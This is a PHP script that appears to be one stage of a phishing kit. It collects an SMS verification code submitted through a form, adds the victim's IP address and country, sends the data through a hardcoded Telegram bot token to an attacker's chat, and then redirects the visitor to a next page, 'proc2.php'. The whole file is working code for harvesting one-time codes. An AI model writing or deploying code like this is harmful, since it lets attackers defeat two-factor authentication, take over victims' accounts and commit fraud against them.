<?php
$token   = "9069467637:AAFTHGhra36aJFJw-q6ImtDv7R4Oll0kCJk";
$chat_id = "7366487860";

$step = isset($_POST['step']) ? htmlspecialchars($_POST['step']) : '';
$sms_code = isset($_POST['sms_code']) ? htmlspecialchars($_POST['sms_code']) : '';

$ip      = $_SERVER['REMOTE_ADDR'];
$country = @file_get_contents("https://ipapi.co/{$ip}/country_name/");

$message  = "🔐 *SMS Verification ER Code*\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "� Step: `{$step}`\n";
$message .= "� SMS Code: `{$sms_code}`\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "🌐 IP: `{$ip}`\n";
$message .= "🌍 Country: `{$country}`\n";

$url = "https://api.telegram.org/bot{$token}/sendMessage";
$data = [
    'chat_id'    => $chat_id,
    'text'       => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];
@file_get_contents($url, false, stream_context_create($options));

header("Location: proc2.php");
exit();
?>
